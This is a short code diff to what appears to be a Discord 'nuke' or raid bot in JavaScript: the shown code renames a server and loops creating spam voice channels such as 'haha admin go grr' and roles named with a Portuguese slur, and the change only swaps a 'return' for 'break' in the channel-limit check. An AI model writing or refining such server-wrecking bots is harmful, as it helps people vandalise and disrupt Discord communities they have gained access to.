@@ -53,7 +53,7 @@ client.on("message", async (message) => {
                         })
                     })
                     message.guild.createChannel(`haha admin go grr`, {type: `voice`})
-                    if(message.guild.channels > 499) return
+                    if(message.guild.channels > 499) break;
                  }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
@@ -75,7 +75,7 @@ client.on("message", async (message) => {
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `voice`})
-                    if(message.guild.channels > 499) return
+                    if(message.guild.channels > 499) break;
                 }
             }
             for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
